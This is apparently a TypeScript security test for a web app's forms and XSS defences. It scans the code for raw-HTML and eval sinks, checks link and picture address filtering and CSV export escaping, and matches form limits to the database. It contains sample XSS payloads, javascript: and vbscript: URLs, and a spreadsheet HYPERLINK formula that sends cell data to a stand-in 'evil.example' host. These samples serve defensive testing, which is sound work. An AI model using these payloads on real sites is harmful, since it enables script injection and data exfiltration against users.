// 1.31.15: forms and XSS. What people type is checked on the server and has a limit in the database (0108); what
// they or other sites wrote is never run as code: no raw HTML but the few listed here (each escaped or the app's own),
// no address opened that isn't a web one or the app's own, pictures in scripts only from web addresses, and exports
// that a spreadsheet can't turn into formulas.
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { csvCell, csvText } from "../lib/csv";
import { DB_LIMITS, FORM_LIMITS, tooLong } from "../lib/form-limits";
import { pictureSrc } from "../modules/scripts/lib/paste-images";
import { renderLiteMarkdown } from "../lib/markdown-lite";

let fails = 0;
const ok = (c: boolean, m: string) => {
  if (!c) {
    fails++;
    console.log("FAIL", m);
  }
};
const root = join(__dirname, "..");
const read = (p: string) => readFileSync(join(root, p), "utf8");
const code: string[] = [];
const walk = (d: string) => {
  for (const n of readdirSync(join(root, d))) {
    if (n === "node_modules" || n.startsWith(".")) continue;
    const p = join(d, n);
    if (statSync(join(root, p)).isDirectory()) walk(p);
    else if (/\.(ts|tsx|mjs|js)$/.test(p)) code.push(p);
  }
};
for (const d of ["app", "lib", "modules", "components"]) walk(d);
code.push("middleware.ts");
ok(code.length > 300, `read the app's code (${code.length} files)`);
// Comments don't count.
const bare = (s: string) => s.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:"'`\\])\/\/.*$/gm, "$1");

// --- Raw HTML: only these, each with why it's safe ---------------------------------------------------------------------
const RAW_HTML: Record<string, string> = {
  "app/layout.tsx": "the first-paint script: the app's own code, with its one value (BRAND_PAGES_RE) a constant; what it reads back is checked",
  "app/(dashboard)/videos/[id]/inline-editable.tsx": "renderLiteMarkdown: everything is escaped first, then a few tags with no attributes are added",
  "modules/scripts/components/pages-grid.tsx": "a copy of the editor's own pages (TipTap's schema, no scripts or handlers), inert; not used anywhere yet",
  "modules/scripts/lib/export-docx.ts": "the editing ideas' print page: every value escaped (title, quote, idea, picture address)",
  "components/ui/mention-input.tsx": 'only ever emptied (innerHTML = "")',
};
const SINK = /dangerouslySetInnerHTML|\.innerHTML\s*=(?!=)|\.outerHTML\s*=(?!=)|insertAdjacentHTML\(|document\.write\(|createContextualFragment\(/;
for (const f of code) {
  const s = bare(read(f));
  if (SINK.test(s)) ok(f in RAW_HTML, `${f} writes raw HTML: escape it (or render it as text), then list it in RAW_HTML with why it's safe`);
  ok(!/\beval\(|new Function\(|setTimeout\(\s*["'`]|setInterval\(\s*["'`]/.test(s), `${f} runs text as code`);
}
for (const f of Object.keys(RAW_HTML)) ok(SINK.test(bare(read(f))), `${f} is listed in RAW_HTML but has no raw HTML any more: take it off the list`);
ok(/\.innerHTML = "";/.test(read("components/ui/mention-input.tsx")) && !/\.innerHTML = [^"]/.test(read("components/ui/mention-input.tsx")), "the mention box only empties itself");
// The lite markdown: escaped first.
ok(renderLiteMarkdown('<img src=x onerror="alert(1)"> **b**') === '&lt;img src=x onerror=&quot;alert(1)&quot;&gt; <strong>b</strong>', "lite markdown escapes everything before adding its tags");
ok(!/<script|on\w+=/i.test(renderLiteMarkdown("<script>alert(1)</script> *x* `y` _z_")), "…so no script or handler gets through");

// --- Opening an address in code (React checks href and src itself; window.open and location don't) -------------------
const NAVIGATES: Record<string, string> = {
  "components/auth/two-step-forms.tsx": "after the code: `next`, made safe on the server (safeNext: the app's own pages only)",
  "app/api/social/[platform]/callback/route.ts": "the popup's way back: /team?… built with URLSearchParams, as JSON",
  "app/(dashboard)/videos/[id]/video-file.tsx": "a signed download link from the app's own server",
  "app/(dashboard)/team/connected-accounts.tsx": "the platform's sign-in address from the app's own server",
  "modules/scripts/components/script-image.tsx": "a picture's web address (pictureSrc, then https?: only)",
  "modules/scripts/components/link-ui.tsx": "a link's web address (webUrl: https or http, no user:password)",
  "modules/scripts/lib/export-docx.ts": "an empty window for the print page",
  "components/search/search-palette.tsx": "a result: the app's own page (starts with one /)",
  "modules/business/components/files-panel.tsx": "a document's signed link from the app's own server (https? only)",
};
const NAV = /window\.open\(|location\.(assign|replace)\(|location\.href\s*=(?!=)|window\.location\s*=(?!=)/;
for (const f of code) if (NAV.test(bare(read(f)))) ok(f in NAVIGATES, `${f} opens an address in code: check it's a web one (or the app's own), then list it in NAVIGATES`);
ok(/if \(webUrl\(href\)\) window\.open\(href, "_blank", "noopener,noreferrer"\);/.test(read("modules/scripts/components/link-ui.tsx")), "a script's link opens only if it's a web address");
ok(/if \(!item\?\.href \|\| !\/\^\\\/\(\?!\[\/\\\\\]\)\/\.test\(item\.href\)\) return false;/.test(read("components/search/search-palette.tsx")), "search opens only the app's own pages");
ok(/if \(!\/\^https\?:\\\/\\\/\/i\.test\(r\.url\)\) return void toast\.error/.test(read("modules/business/components/files-panel.tsx")), "a business document opens only from a web address");
ok(!code.some((f) => /["'`]javascript:/i.test(bare(read(f)).replace(/React has blocked a javascript: URL/g, ""))), "no javascript: address anywhere in the app");

// --- Pictures in scripts ------------------------------------------------------------------------------------------------
for (const [src, want] of [
  ["https://x.supabase.co/storage/v1/object/public/script-images/a.png", true],
  ["http://example.com/a.jpg", true],
  ["blob:https://app.cliptroop.com/1234", true],
  ["javascript:alert(1)", false],
  [" JaVaScRiPt:alert(1)", false],
  ["data:text/html,<script>alert(1)</script>", false],
  ["data:image/png;base64,AAAA", false],
  ["/storage/v1/object/public/x.png", false],
  ["vbscript:msgbox(1)", false],
  ["blob:null/1234", false],
  ["", false],
] as const)
  ok(!!pictureSrc(src) === want, `a script picture at ${src || "(nothing)"}: ${want ? "shown" : "left out"}`);
ok(pictureSrc(42) === null && pictureSrc(null) === null, "a picture address that isn't text: left out");
const image = read("modules/scripts/components/script-image.tsx");
ok(/const src = pictureSrc\(raw\) \?\? "";/.test(image) && /src=\{src \|\| undefined\}/.test(image), "a script picture shows only a web address (or this device's upload)");
ok(/const src = pictureSrc\(raw\);\s*if \(!src\) return;/.test(image) && /if \(\/\^https\?:\\\/\\\/\/i\.test\(src\)\) window\.open\(src, "_blank", "noopener"\);/.test(image), "…and downloads only one");
ok(/\{viewing && src && <ImageLightbox/.test(image), "…and opens full size only one");
ok(/else if \(!pictureSrc\(src\) \|\| \(unkeepableSrc\(src\) && !blobs\.current\.has\(src\.trim\(\)\)\)\)/.test(read("modules/scripts/components/use-script-images.ts")), "a pasted picture that isn't on the web is left out");

// --- Exports a spreadsheet can't turn into formulas -------------------------------------------------------------------------
for (const [v, want] of [
  ["=HYPERLINK(\"https://evil.example?\"&A1,\"Click\")", `"'=HYPERLINK(""https://evil.example?""&A1,""Click"")"`],
  ["+1+1", "'+1+1"],
  ["-2+3", "'-2+3"],
  ["@SUM(A1)", "'@SUM(A1)"],
  ["\tTab", "'\tTab"],
  ["-12.50", "-12.50"],
  ["+5", "+5"],
  ["A normal title, with a comma", `"A normal title, with a comma"`],
  ["She said \"hi\"", `"She said ""hi"""`],
  ["2026-10-25", "2026-10-25"],
] as const)
  ok(csvCell(v) === want, `a cell ${JSON.stringify(v)} → ${JSON.stringify(csvCell(v))} (want ${JSON.stringify(want)})`);
ok(csvCell(-3) === "-3" && csvCell(null) === "" && csvCell(undefined) === "" && csvCell(Number.NaN) === "", "numbers stay numbers, nothing is empty");
ok(csvText([["a", 1], ["=b", null]]) === "﻿a,1\r\n'=b,", "the whole file");
ok(/const blob = new Blob\(\[csvText\(rows\)\], \{ type: "text\/csv;charset=utf-8" \}\);/.test(read("modules/analytics/components/tabs/shared.tsx")), "Analytics' exports go through csvText");

// --- Forms: the server checks, at the database's limits or under -------------------------------------------------------------
const limits = read("supabase/migrations/0108_form_limits.sql");
for (const [key, max] of Object.entries(DB_LIMITS)) {
  const [tbl, col] = key.split(".");
  const m = new RegExp(`\\('${tbl}', '${col}', 'char_length\\(${col}\\) <= (\\d+)'\\)`).exec(limits);
  ok(!!m && Number(m[1]) === max, `${key}: the app's limit ${max} is the database's (${m?.[1] ?? "none"})`);
}
for (const [k, v] of Object.entries(FORM_LIMITS)) ok(v > 0 && v <= 50_000, `${k}: a sensible limit`);
ok(FORM_LIMITS.videoTitle <= DB_LIMITS["long_video_projects.title"] && FORM_LIMITS.fullName <= DB_LIMITS["profiles.full_name"], "the forms' own limits are under the database's");
ok(tooLong("x".repeat(10_001), 10_000, "the hook") === "Keep the hook under 10,000 characters." && tooLong("x".repeat(10_000), 10_000, "the hook") === null, "tooLong says how long");
const newVideo = read("app/(dashboard)/videos/new/actions.ts");
ok(/titles\.some\(\(t\) => t\.length > FORM_LIMITS\.videoTitle\)/.test(newVideo) && /tooLong\(hook, FORM_LIMITS\.hook, "the hook"\)/.test(newVideo) && /tooLong\(notes, FORM_LIMITS\.notes, "the notes"\)/.test(newVideo), "a new long video: titles, hook, notes, budget and theme checked");
const page = read("app/(dashboard)/videos/[id]/actions.ts");
ok(/if \(typeof value !== "string"\) return \{ error: "Couldn't save\. Try again\." \};\s*const long = tooLong\(value, FIELD_MAX\[field\], FIELD_NAME\[field\]\);/.test(page), "a long video's hook, notes and budget: text, and not too long");
ok(/tooLong\(theme\.trim\(\), FORM_LIMITS\.theme, "the theme"\)/.test(page), "…and its theme");
ok(/if \(fullName\.length > FORM_LIMITS\.fullName\)/.test(read("app/(dashboard)/settings/actions.ts")), "your name in Settings");
ok(/new\.username !~ '\^\[A-Za-z0-9_\]\{3,20\}\$'/.test(limits) && /\/\^\[a-zA-Z0-9_\]\{3,20\}\$\/\.test\(username\)/.test(read("app/(dashboard)/settings/actions.ts")), "a username: the same rule in Settings and the database");

if (fails) {
  console.log(`${fails} FAILED`);
  process.exit(1);
}
console.log("forms and XSS: all good");
